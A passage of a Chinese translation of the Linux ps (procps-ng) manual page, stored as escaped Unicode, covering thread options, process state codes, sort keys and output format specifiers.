\u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 \u7ebf\u7a0b\u663e\u793a H \u663e\u793a\u7ebf\u7a0b\uff0c\u4eff\u4f5b\u5b83\u4eec\u662f\u8fdb\u7a0b\u3002 -L \u663e\u793a\u7ebf\u7a0b\uff0c\u53ef\u80fd\u5e26\u6709 LWP \u548c NLWP \u5217\u3002 m \u5728\u8fdb\u7a0b\u540e\u663e\u793a\u7ebf\u7a0b\u3002 -m \u5728\u8fdb\u7a0b\u540e\u663e\u793a\u7ebf\u7a0b\u3002 -T \u663e\u793a\u7ebf\u7a0b\uff0c\u53ef\u80fd\u5e26\u6709 SPID \u5217\u3002 \u5176\u4ed6\u4fe1\u606f --help section \u6253\u5370\u5e2e\u52a9\u4fe1\u606f\u3002section \u53c2\u6570\u53ef\u4ee5\u662f simple, list, output, threads, misc \u6216 all \u4e4b\u4e00\u3002 \u53c2\u6570\u53ef\u4ee5\u7f29\u5199\u4e3a\u4e00\u4e2a\u4e0b\u5212\u7ebf\u5b57\u6bcd\uff0c\u5982\uff1as|l|o|t|m|a\u3002 --info \u6253\u5370\u8c03\u8bd5\u4fe1\u606f\u3002 L \u5217\u51fa\u6240\u6709\u683c\u5f0f\u8bf4\u660e\u7b26\u3002 V \u6253\u5370 procps-ng \u7248\u672c\u3002 -V \u6253\u5370 procps-ng \u7248\u672c\u3002 --version \u6253\u5370 procps-ng \u7248\u672c\u3002 \u6ce8\u610f\u4e8b\u9879 \u8be5 ps \u901a\u8fc7\u8bfb\u53d6 /proc \u4e2d\u7684\u865a\u62df\u6587\u4ef6\u5de5\u4f5c\u3002\u6b64 ps \u4e0d\u9700\u8981\u8bbe\u7f6e\u4e3a setuid kmem \u6216\u5177\u6709\u4efb\u4f55\u6743\u9650\u5373\u53ef\u8fd0\u884c\u3002 \u4e0d\u8981\u7ed9\u4e88\u6b64 ps \u4efb\u4f55\u7279\u6b8a\u6743\u9650\u3002 CPU \u4f7f\u7528\u60c5\u51b5\u76ee\u524d\u8868\u793a\u4e3a\u8fdb\u7a0b\u6574\u4e2a\u751f\u547d\u5468\u671f\u5185\u8fd0\u884c\u6240\u82b1\u8d39\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\u8fd9\u5e76\u4e0d\u7406\u60f3\uff0c \u4e5f\u4e0d\u7b26\u5408 ps \u5176\u4ed6\u65b9\u9762\u7b26\u5408\u7684\u6807\u51c6\u3002CPU \u4f7f\u7528\u60c5\u51b5\u4e0d\u592a\u53ef\u80fd\u6b63\u597d\u52a0\u8d77\u6765\u4e3a 100%\u3002 SIZE \u548c RSS \u5b57\u6bb5\u4e0d\u5305\u62ec\u8fdb\u7a0b\u7684\u4e00\u4e9b\u90e8\u5206\uff0c\u5305\u62ec\u9875\u8868\u3001\u5185\u6838\u5806\u6808\u3001struct thread_info \u548c struct task_struct\u3002\u8fd9\u901a\u5e38\u81f3\u5c11\u5360\u7528 20 KiB \u7684\u5e38\u9a7b\u5185\u5b58\u3002SIZE \u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5927\u5c0f\uff08\u4ee3\u7801 + \u6570\u636e + \u6808\uff09\u3002 \u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u5df2\u6b7b\u8fdb\u7a0b\uff08\u6240\u8c13\u7684\u201c\u50f5\u5c38\u201d\uff09\uff0c\u56e0\u4e3a\u5b83\u4eec\u7684\u7236\u8fdb\u7a0b\u6ca1\u6709\u6b63\u786e\u9500\u6bc1\u5b83\u4eec\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u9000\u51fa\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u5c06\u7531 init(8) \u9500\u6bc1\u3002 \u5982\u679c\u7528\u6237\u540d\u7684\u957f\u5ea6\u8d85\u8fc7\u663e\u793a\u5217\u7684\u957f\u5ea6\uff0c\u5219\u7528\u6237\u540d\u5c06\u88ab\u622a\u65ad\u3002\u8bf7\u53c2\u89c1 -o \u548c -O \u683c\u5f0f\u5316\u9009\u9879\u4ee5\u81ea\u5b9a\u4e49\u957f\u5ea6\u3002 ps -aux \u7b49\u547d\u4ee4\u9009\u9879\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u4e24\u4e2a\u4e0d\u540c\u6807\u51c6\u7684\u6df7\u5408\u3002\u6839\u636e POSIX \u548c UNIX \u6807\u51c6\uff0c \u4e0a\u8ff0\u547d\u4ee4\u8981\u6c42\u663e\u793a\u6240\u6709\u5177\u6709 TTY \u7684\u8fdb\u7a0b\uff08\u901a\u5e38\u662f\u7528\u6237\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\uff09\u4ee5\u53ca\u6240\u6709\u7531\u540d\u4e3a x \u7684\u7528\u6237 \u62e5\u6709\u7684\u8fdb\u7a0b\u3002\u5982\u679c\u8be5\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5219 ps \u5c06\u5047\u8bbe\u60a8\u5b9e\u9645\u4e0a\u662f\u6307 ps aux\u3002 \u8fdb\u7a0b\u6807\u5fd7 \u8fd9\u4e9b\u503c\u7684\u603b\u548c\u663e\u793a\u5728\u7531\u6807\u5fd7\u8f93\u51fa\u8bf4\u660e\u7b26\u63d0\u4f9b\u7684\u201cF\u201d\u5217\u4e2d\uff1a 1 forked \u4f46\u6ca1\u6709 exec 4 \u4f7f\u7528\u4e86\u8d85\u7ea7\u7528\u6237\u6743\u9650 \u8fdb\u7a0b\u72b6\u6001\u4ee3\u7801 \u8fd9\u91cc\u662f s, stat \u548c state \u8f93\u51fa\u8bf4\u660e\u7b26\uff08\u6807\u9898\u4e3a\u201cSTAT\u201d\u6216\u201cS\u201d\uff09\u5c06\u663e\u793a\u7684\u4e0d\u540c\u503c\uff0c\u4ee5\u63cf\u8ff0\u8fdb\u7a0b\u7684\u72b6\u6001\uff1a D \u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\uff08\u901a\u5e38\u4e3a I/O\uff09 I \u7a7a\u95f2\u5185\u6838\u7ebf\u7a0b R \u8fd0\u884c\u6216\u53ef\u8fd0\u884c\uff08\u5728\u8fd0\u884c\u961f\u5217\u4e2d\uff09 S \u53ef\u4e2d\u65ad\u7761\u7720\uff08\u7b49\u5f85\u4e8b\u4ef6\u5b8c\u6210\uff09 T \u88ab\u4f5c\u4e1a\u63a7\u5236\u4fe1\u53f7\u505c\u6b62 t \u5728\u8ddf\u8e2a\u671f\u95f4\u88ab\u8c03\u8bd5\u5668\u505c\u6b62 W \u5206\u9875\uff08\u81ea 2.6.xx \u5185\u6838\u4ee5\u6765\u65e0\u6548\uff09 X \u6b7b\u4ea1\uff08\u4e0d\u5e94\u770b\u5230\uff09 Z \u50f5\u5c38\u8fdb\u7a0b\uff0c\u5df2\u7ec8\u6b62\u4f46\u672a\u88ab\u5176\u7236\u8fdb\u7a0b\u56de\u6536 \u5bf9\u4e8e BSD \u683c\u5f0f\u548c\u4f7f\u7528 stat \u5173\u952e\u5b57\u65f6\uff0c\u53ef\u80fd\u4f1a\u663e\u793a\u5176\u4ed6\u5b57\u7b26\uff1a < \u9ad8\u4f18\u5148\u7ea7\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u4e0d\u53cb\u597d\uff09 N \u4f4e\u4f18\u5148\u7ea7\uff08\u5bf9\u5176\u4ed6\u7528\u6237\u53cb\u597d\uff09 L \u9875\u9762\u9501\u5b9a\u5230\u5185\u5b58\u4e2d\uff08\u7528\u4e8e\u5b9e\u65f6\u548c\u81ea\u5b9a\u4e49 I/O\uff09 s \u662f\u4f1a\u8bdd\u9886\u5bfc l \u662f\u591a\u7ebf\u7a0b\u7684\uff08\u4f7f\u7528 CLONE_THREAD\uff0c\u5982 NPTL pthreads\uff09 + \u662f\u524d\u53f0\u8fdb\u7a0b\u7ec4 \u8fc7\u65f6\u7684\u6392\u5e8f\u952e \u8fd9\u4e9b\u952e\u7531 BSD O \u9009\u9879\u4f7f\u7528\uff08\u5f53\u5b83\u7528\u4e8e\u6392\u5e8f\u65f6\uff09\u3002GNU --sort \u9009\u9879\u4e0d\u4f7f\u7528\u8fd9\u4e9b\u952e\uff0c \u800c\u662f\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u63cf\u8ff0\u7684\u8bf4\u660e\u7b26\u3002\u8bf7\u6ce8\u610f\uff0c\u7528\u4e8e\u6392\u5e8f\u7684\u503c\u662f ps \u4f7f\u7528\u7684\u5185\u90e8\u503c\uff0c \u800c\u4e0d\u662f\u67d0\u4e9b\u8f93\u51fa\u683c\u5f0f\u5b57\u6bb5\u4e2d\u4f7f\u7528\u7684\u201c\u52a0\u5de5\u201d\u503c\uff08\u4f8b\u5982\uff0c\u6309 tty \u6392\u5e8f\u5c06\u6392\u5e8f\u4e3a\u8bbe\u5907\u53f7\uff0c \u800c\u4e0d\u662f\u6839\u636e\u663e\u793a\u7684\u7ec8\u7aef\u540d\u79f0\u6392\u5e8f\uff09\u3002\u5982\u679c\u60a8\u60f3\u6309\u52a0\u5de5\u503c\u6392\u5e8f\uff0c\u8bf7\u5c06 ps \u8f93\u51fa\u7ba1\u9053\u4f20\u8f93\u5230 sort(1) \u547d\u4ee4\u3002 \u952e \u957f\u683c\u5f0f \u63cf\u8ff0 c cmd \u53ef\u6267\u884c\u6587\u4ef6\u7684\u7b80\u5355\u540d\u79f0 C pcpu CPU \u4f7f\u7528\u7387 f flags \u6807\u5fd7\uff0c\u5982\u957f\u683c\u5f0f F \u5b57\u6bb5 g pgrp \u8fdb\u7a0b\u7ec4 ID G tpgid \u63a7\u5236 tty \u7684\u8fdb\u7a0b\u7ec4 ID j cutime \u7d2f\u8ba1\u7528\u6237\u65f6\u95f4 J cstime \u7d2f\u8ba1\u7cfb\u7edf\u65f6\u95f4 k utime \u7528\u6237\u65f6\u95f4 m min_flt \u6b21\u8981\u9875\u9762\u9519\u8bef\u6570 M maj_flt \u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570 n cmin_flt \u7d2f\u8ba1\u6b21\u8981\u9875\u9762\u9519\u8bef\u6570 N cmaj_flt \u7d2f\u8ba1\u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570 o session \u4f1a\u8bdd ID p pid \u8fdb\u7a0b ID P ppid \u7236\u8fdb\u7a0b ID r rss \u5e38\u9a7b\u96c6\u5927\u5c0f R resident \u5e38\u9a7b\u9875\u9762 s size \u5185\u5b58\u5927\u5c0f\uff08\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\uff09 S share \u5171\u4eab\u9875\u9762\u7684\u6570\u91cf t tty \u63a7\u5236 tty \u7684\u8bbe\u5907\u53f7 T start_time \u8fdb\u7a0b\u5f00\u59cb\u65f6\u95f4 U uid \u7528\u6237 ID \u53f7 u user \u7528\u6237\u540d v vsize \u603b\u865a\u62df\u5185\u5b58\u5927\u5c0f\uff08\u4ee5 KiB \u4e3a\u5355\u4f4d\uff09 y priority \u5185\u6838\u8c03\u5ea6\u4f18\u5148\u7ea7 AIX \u683c\u5f0f\u63cf\u8ff0\u7b26 \u8be5 ps \u652f\u6301 AIX \u683c\u5f0f\u63cf\u8ff0\u7b26\uff0c\u5176\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c\u4e8e printf(1) \u548c printf(3) \u7684\u683c\u5f0f\u4ee3\u7801\u3002 \u4f8b\u5982\uff0c\u53ef\u4ee5\u4f7f\u7528\u6b64\u547d\u4ee4\u751f\u6210\u6b63\u5e38\u7684\u9ed8\u8ba4\u8f93\u51fa\uff1aps -eo \"%p %y %x %c\"\u3002\u4ee5\u4e0b\u662f\u6b63\u5e38\u4ee3\u7801\u7684\u63cf\u8ff0\u3002 \u4ee3\u7801 \u6b63\u5e38 \u6807\u9898 %C pcpu %CPU %G group GROUP %P ppid PPID %U user USER %a args COMMAND %c comm COMMAND %g rgroup RGROUP %n nice NI %p pid PID %r pgid PGID %t etime ELAPSED %u ruser RUSER %x time TIME %y tty TTY %z vsz VSZ \u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26 \u4ee5\u4e0b\u662f\u53ef\u7528\u4e8e\u63a7\u5236\u8f93\u51fa\u683c\u5f0f\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -o \u9009\u9879\uff09\u6216\u4f7f\u7528 GNU \u98ce\u683c --sort \u9009\u9879\u5bf9\u9009\u5b9a\u8fdb\u7a0b\u8fdb\u884c\u6392\u5e8f\u7684\u4e0d\u540c\u5173\u952e\u5b57\u3002 \u4f8b\u5982\uff1aps -eo pid,user,args --sort user \u6b64\u7248\u672c\u7684 ps \u5c1d\u8bd5\u8bc6\u522b\u5927\u591a\u6570\u5176\u4ed6 ps \u5b9e\u73b0\u4e2d\u4f7f\u7528\u7684\u5173\u952e\u5b57\u3002 \u4ee5\u4e0b\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u8bf4\u660e\u7b26\u53ef\u80fd\u5305\u542b\u7a7a\u683c\uff1aargs, cmd, comm, command, fname, ucmd, ucomm, lstart, bsdstart, start\u3002 \u67d0\u4e9b\u5173\u952e\u5b57\u53ef\u80fd\u4e0d\u53ef\u7528\u4e8e\u6392\u5e8f\u3002 \u4ee3\u7801 \u6807\u9898 \u63cf\u8ff0 %cpu %CPU \u8fdb\u7a0b\u7684 CPU \u5229\u7528\u7387\uff0c\u4ee5\u201c##.#\u201d\u683c\u5f0f\u8868\u793a\u3002\u76ee\u524d\uff0c\u5b83\u662f\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u9664\u4ee5\u8fdb\u7a0b\u8fd0\u884c\u7684\u65f6\u95f4\uff08cputime/realtime \u6bd4\u7387\uff09\uff0c\u4ee5\u767e\u5206\u6bd4\u8868\u793a\u3002\u4e0d\u4e00\u5b9a\u52a0\u8d77\u6765\u4e3a 100%\u3002\uff08\u522b\u540d pcpu\uff09\u3002 %mem %MEM \u8fdb\u7a0b\u7684\u5e38\u9a7b\u96c6\u5927\u5c0f\u4e0e\u673a\u5668\u7269\u7406\u5185\u5b58\u7684\u6bd4\u7387\uff0c\u4ee5\u767e\u5206\u6bd4\u8868\u793a\u3002\uff08\u522b\u540d pmem\uff09\u3002 args COMMAND \u547d\u4ee4\u53ca\u5176\u6240\u6709\u53c2\u6570\u4f5c\u4e3a\u5b57\u7b26\u4e32\u663e\u793a\u3002\u53c2\u6570\u7684\u4fee\u6539\u53ef\u80fd\u4f1a\u663e\u793a\u5728\u5185\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002\u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u90e8\u5206\u6b7b\u4ea1\u7684\uff0c\u7b49\u5f85\u7236\u8fdb\u7a0b\u5b8c\u5168\u9500\u6bc1\u3002\u6709\u65f6\uff0c\u8fdb\u7a0b\u53c2\u6570\u4e0d\u53ef\u7528\uff1b\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cps \u5c06\u6253\u5370\u53ef\u6267\u884c\u6587\u4ef6\u540d\uff0c\u62ec\u53f7\u4e2d\u663e\u793a\u3002\uff08\u522b\u540d cmd, command\uff09\u3002\u53c2\u89c1 comm \u683c\u5f0f\u5173\u952e\u5b57\u3001-f \u9009\u9879\u548c c \u9009\u9879\u3002 \u5f53\u6700\u540e\u6307\u5b9a\u6b64\u5217\u65f6\uff0c\u8be5\u5217\u5c06\u5ef6\u4f38\u5230\u663e\u793a\u7684\u8fb9\u7f18\u3002\u5982\u679c ps \u65e0\u6cd5\u786e\u5b9a\u663e\u793a\u5bbd\u5ea6\uff0c\u4f8b\u5982\u8f93\u51fa\u88ab\u91cd\u5b9a\u5411\uff08\u7ba1\u9053\uff09\u5230\u6587\u4ef6\u6216\u5176\u4ed6\u547d\u4ee4\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u672a\u5b9a\u4e49\uff08\u53ef\u80fd\u4e3a 80\uff0c\u6216\u65e0\u9650\uff0c\u6216\u7531 TERM \u53d8\u91cf\u786e\u5b9a\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff09\u3002\u53ef\u4ee5\u4f7f\u7528 COLUMNS \u73af\u5883\u53d8\u91cf\u6216 --cols \u9009\u9879\u6765\u51c6\u786e\u786e\u5b9a\u6b64\u60c5\u51b5\u7684\u5bbd\u5ea6\u3002w \u6216 -w \u9009\u9879\u4e5f\u53ef\u7528\u4e8e\u8c03\u6574\u5bbd\u5ea6\u3002 blocked BLOCKED \u88ab\u963b\u585e\u4fe1\u53f7\u7684\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_block, sigmask\uff09\u3002 bsdstart START \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u5982\u679c\u8fdb\u7a0b\u5728\u8fc7\u53bb 24 \u5c0f\u65f6\u5185\u542f\u52a8\uff0c\u8f93\u51fa\u683c\u5f0f\u4e3a\u201c HH:MM\u201d\uff0c\u5426\u5219\u4e3a\u201c Mmm:SS\u201d\uff08\u5176\u4e2d Mmm \u662f\u6708\u4efd\u7684\u4e09\u4e2a\u5b57\u6bcd\uff09\u3002\u53c2\u89c1 lstart\u3001start\u3001start_time \u548c stime\u3002 bsdtime TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u7528\u6237 + \u7cfb\u7edf\u3002\u663e\u793a\u683c\u5f0f\u901a\u5e38\u4e3a\u201cMMM:SS\u201d\uff0c\u4f46\u5982\u679c\u8fdb\u7a0b\u4f7f\u7528\u4e86\u8d85\u8fc7 999 \u5206\u949f\u7684 CPU \u65f6\u95f4\uff0c\u5219\u53ef\u4ee5\u5411\u53f3\u79fb\u52a8\u3002 c C \u5904\u7406\u5668\u5229\u7528\u7387\u3002\u76ee\u524d\uff0c\u8fd9\u662f\u8fdb\u7a0b\u751f\u547d\u5468\u671f\u5185\u767e\u5206\u6bd4\u4f7f\u7528\u7387\u7684\u6574\u6570\u503c\u3002\uff08\u53c2\u89c1 %cpu\uff09\u3002 caught CAUGHT \u6355\u83b7\u7684\u4fe1\u53f7\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_catch, sigcatch\uff09\u3002 cgname CGNAME \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u540d\u79f0\u3002 cgroup CGROUP \u663e\u793a\u8fdb\u7a0b\u6240\u5c5e\u7684\u63a7\u5236\u7ec4\u3002 class CLS \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d policy, cls\uff09\u3002\u5b57\u6bb5\u7684\u53ef\u80fd\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c cls CLS \u8fdb\u7a0b\u7684\u8c03\u5ea6\u7c7b\u3002\uff08\u522b\u540d policy, cls\uff09\u3002\u5b57\u6bb5\u7684\u53ef\u80fd\u503c\u4e3a\uff1a - \u672a\u62a5\u544a TS SCHED_OTHER FF SCHED_FIFO RR SCHED_RR B SCHED_BATCH ISO SCHED_ISO IDL SCHED_IDLE DLN SCHED_DEADLINE ? \u672a\u77e5\u503c cmd CMD \u53c2\u89c1 args\u3002\uff08\u522b\u540d args, command\uff09\u3002 comm COMMAND \u547d\u4ee4\u540d\u79f0\uff08\u4ec5\u53ef\u6267\u884c\u6587\u4ef6\u540d\uff09\u3002\u4e0d\u4f1a\u663e\u793a\u547d\u4ee4\u540d\u79f0\u7684\u4fee\u6539\u3002\u6807\u8bb0\u4e3a <defunct> \u7684\u8fdb\u7a0b\u662f\u90e8\u5206\u6b7b\u4ea1\u7684\uff0c\u7b49\u5f85\u7236\u8fdb\u7a0b\u5b8c\u5168\u9500\u6bc1\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002\uff08\u522b\u540d ucmd, ucomm\uff09\u3002\u53c2\u89c1 args \u683c\u5f0f\u5173\u952e\u5b57\u3001-f \u9009\u9879\u548c c \u9009\u9879\u3002 \u5f53\u6700\u540e\u6307\u5b9a\u6b64\u5217\u65f6\uff0c\u8be5\u5217\u5c06\u5ef6\u4f38\u5230\u663e\u793a\u7684\u8fb9\u7f18\u3002\u5982\u679c ps \u65e0\u6cd5\u786e\u5b9a\u663e\u793a\u5bbd\u5ea6\uff0c\u4f8b\u5982\u8f93\u51fa\u88ab\u91cd\u5b9a\u5411\uff08\u7ba1\u9053\uff09\u5230\u6587\u4ef6\u6216\u5176\u4ed6\u547d\u4ee4\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u672a\u5b9a\u4e49\uff08\u53ef\u80fd\u4e3a 80\uff0c\u6216\u65e0\u9650\uff0c\u6216\u7531 TERM \u53d8\u91cf\u786e\u5b9a\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff09\u3002\u53ef\u4ee5\u4f7f\u7528 COLUMNS \u73af\u5883\u53d8\u91cf\u6216 --cols \u9009\u9879\u6765\u51c6\u786e\u786e\u5b9a\u6b64\u60c5\u51b5\u7684\u5bbd\u5ea6\u3002w \u6216 -w \u9009\u9879\u4e5f\u53ef\u7528\u4e8e\u8c03\u6574\u5bbd\u5ea6\u3002 command COMMAND \u53c2\u89c1 args\u3002\uff08\u522b\u540d args, command\uff09\u3002 cp CP \u6bcf\u5343 CPU \u4f7f\u7528\u7387\uff08\u767e\u5206\u4e4b\u4e00\u7684\u5341\u5206\u4e4b\u4e00\uff09\u3002\uff08\u53c2\u89c1 %cpu\uff09\u3002 cputime TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u201c[DD-]hh:mm:ss\u201d\u683c\u5f0f\u3002\uff08\u522b\u540d time\uff09\u3002 cputimes TIME \u7d2f\u8ba1 CPU \u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff08\u522b\u540d times\uff09\u3002 drs DRS \u6570\u636e\u5e38\u9a7b\u96c6\u5927\u5c0f\uff0c\u5206\u914d\u7ed9\u975e\u53ef\u6267\u884c\u4ee3\u7801\u7684\u7269\u7406\u5185\u5b58\u91cf\u3002 egid EGID \u8fdb\u7a0b\u7684\u6709\u6548\u7ec4 ID \u53f7\uff0c\u4ee5\u5341\u8fdb\u5236\u6574\u6570\u8868\u793a\u3002\uff08\u522b\u540d gid\uff09\u3002 egroup EGROUP \u8fdb\u7a0b\u7684\u6709\u6548\u7ec4 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d group\uff09\u3002 eip EIP \u6307\u4ee4\u6307\u9488\u3002 esp ESP \u6808\u6307\u9488\u3002 etime ELAPSED \u81ea\u8fdb\u7a0b\u542f\u52a8\u4ee5\u6765\u7684\u7ecf\u8fc7\u65f6\u95f4\uff0c\u683c\u5f0f\u4e3a [[DD-]hh:]mm:ss\u3002 etimes ELAPSED \u81ea\u8fdb\u7a0b\u542f\u52a8\u4ee5\u6765\u7684\u7ecf\u8fc7\u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002 euid EUID \u6709\u6548\u7528\u6237 ID\uff08\u522b\u540d uid\uff09\u3002 euser EUSER \u6709\u6548\u7528\u6237\u540d\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002n \u9009\u9879\u53ef\u4ee5\u7528\u4e8e\u5f3a\u5236\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d uname, user\uff09\u3002 exe EXE \u53ef\u6267\u884c\u6587\u4ef6\u7684\u8def\u5f84\u3002\u5982\u679c\u8def\u5f84\u65e0\u6cd5\u901a\u8fc7 cmd\u3001comm \u6216 args \u683c\u5f0f\u9009\u9879\u6253\u5370\uff0c\u5219\u5f88\u6709\u7528\u3002 f F \u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u6807\u5fd7\uff0c\u53c2\u89c1\u8fdb\u7a0b\u6807\u5fd7\u90e8\u5206\u3002\uff08\u522b\u540d flag, flags\uff09\u3002 fgid FGID \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7ec4 ID\u3002\uff08\u522b\u540d fsgid\uff09\u3002 fgroup FGROUP \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7ec4 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7ec4 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002\uff08\u522b\u540d fsgroup\uff09\u3002 flag F \u53c2\u89c1 f\u3002\uff08\u522b\u540d f, flags\uff09\u3002 flags F \u53c2\u89c1 f\u3002\uff08\u522b\u540d f, flag\uff09\u3002 fname COMMAND \u8fdb\u7a0b\u53ef\u6267\u884c\u6587\u4ef6\u540d\u79f0\u7684\u524d 8 \u4e2a\u5b57\u8282\u3002\u6b64\u5217\u4e2d\u7684\u8f93\u51fa\u53ef\u80fd\u5305\u542b\u7a7a\u683c\u3002 fuid FUID \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7528\u6237 ID\u3002\uff08\u522b\u540d fsuid\uff09\u3002 fuser FUSER \u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u7528\u6237 ID\u3002\u5982\u679c\u53ef\u4ee5\u83b7\u5f97\u4e14\u5b57\u6bb5\u5bbd\u5ea6\u5141\u8bb8\uff0c\u8fd9\u5c06\u662f\u6587\u672c\u7528\u6237 ID\uff0c\u5426\u5219\u4e3a\u5341\u8fdb\u5236\u8868\u793a\u3002 gid GID \u53c2\u89c1 egid\u3002\uff08\u522b\u540d egid\uff09\u3002 group GROUP \u53c2\u89c1 egroup\u3002\uff08\u522b\u540d egroup\uff09\u3002 ignored IGNORED \u88ab\u5ffd\u7565\u4fe1\u53f7\u7684\u63a9\u7801\uff0c\u53c2\u89c1 signal(7)\u3002\u6839\u636e\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff0c\u4ee5 32 \u6216 64 \u4f4d\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u63a9\u7801\u3002\uff08\u522b\u540d sig_ignore, sigignore\uff09\u3002 ipcns IPCNS \u63cf\u8ff0\u8fdb\u7a0b\u6240\u5c5e\u7684\u547d\u540d\u7a7a\u95f4\u7684\u552f\u4e00 inode \u53f7\u3002\u53c2\u89c1 namespaces(7)\u3002 label LABEL \u5b89\u5168\u6807\u7b7e\uff0c\u6700\u5e38\u7528\u4e8e SELinux \u4e0a\u4e0b\u6587\u6570\u636e\u3002\u8fd9\u9002\u7528\u4e8e\u9ad8\u5b89\u5168\u7cfb\u7edf\u4e0a\u7684\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\uff08\u201cMAC\u201d\uff09\u3002 lstart STARTED \u547d\u4ee4\u542f\u52a8\u65f6\u95f4\u3002\u53c2\u89c1 bsdstart\u3001start\u3001start_time \u548c stime\u3002 lsession SESSION \u663e\u793a\u8fdb\u7a0b\u7684\u767b\u5f55\u4f1a\u8bdd\u6807\u8bc6\u7b26\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 luid LUID \u663e\u793a\u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u767b\u5f55 ID\u3002 lwp LWP \u53ef\u8c03\u5ea6\u5b9e\u4f53\u7684\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff08\u7ebf\u7a0b\uff09ID\uff08\u522b\u540d spid, tid\uff09\u3002\u53c2\u89c1 tid \u83b7\u53d6\u5176\u4ed6\u4fe1\u606f\u3002 lxc LXC \u663e\u793a\u4efb\u52a1\u8fd0\u884c\u6240\u5728\u7684 lxc \u5bb9\u5668\u540d\u79f0\u3002\u5982\u679c\u8fdb\u7a0b\u672a\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff0c\u5219\u663e\u793a\u4e00\u4e2a\u7834\u6298\u53f7\uff08\u2018-\u2019\uff09\u3002 machine MACHINE \u663e\u793a\u5206\u914d\u7ed9 VM \u6216\u5bb9\u5668\u7684\u8fdb\u7a0b\u7684\u673a\u5668\u540d\u79f0\uff08\u5982\u679c\u5305\u542b systemd \u652f\u6301\uff09\u3002 maj_flt MAJFLT \u6b64\u8fdb\u7a0b\u53d1\u751f\u7684\u4e3b\u8981\u9875\u9762\u9519\u8bef\u6570\u3002 min_flt MINFLT 